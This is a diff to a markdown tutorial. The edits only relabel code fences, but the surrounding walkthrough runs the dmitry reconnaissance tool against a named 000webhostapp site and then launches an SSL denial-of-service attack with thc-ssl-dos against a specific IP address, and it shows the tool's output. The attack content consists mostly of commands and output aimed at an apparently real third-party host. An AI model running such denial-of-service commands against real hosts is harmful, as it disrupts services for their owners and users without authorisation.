@@ -34,7 +34,7 @@ we see that the website is available.
 ```bash
 thc-ssl-dos 
 ```
-```
+```bash
      ______________ ___  _________
      \__    ___/   |   \ \_   ___ \
        |    | /    ~    \/    \  \/
@@ -61,7 +61,7 @@ run this command
 dmitry samglishinc.000webhostapp.com
 ```
 Output
-```
+```bash
 Deepmagic Information Gathering Tool
 "There be some deep magic going on"
 
@@ -76,7 +76,7 @@ Gathered Inet-whois information for 145.14.145.210
 thc-ssl-dos 145.14.145.210 --accept
 ```
 Output
-```
+```bash
 Waiting for script kiddies to piss off................
 The force is with those who read the source...
 Handshakes 0 [0.00 h/s], 1 Conn, 0 Err
